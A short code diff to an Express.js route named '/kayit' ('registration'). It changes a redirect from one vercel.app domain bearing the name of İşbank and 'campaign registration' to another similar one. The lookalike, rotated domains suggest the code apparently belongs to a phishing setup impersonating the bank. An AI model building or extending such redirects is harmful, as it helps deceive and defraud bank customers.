@@ -83,7 +83,7 @@ app.get('/kayit', (req, res) => {
     // https://isbank-kampanyalar-kayit.vercel.app/
 
     // Kullanıcıyı yönlendir
-    res.redirect('https://isbank-kampanya-kayit.vercel.app');
+    res.redirect('https://isbank-kampanya-kayitlar.vercel.app');
 });
 
 
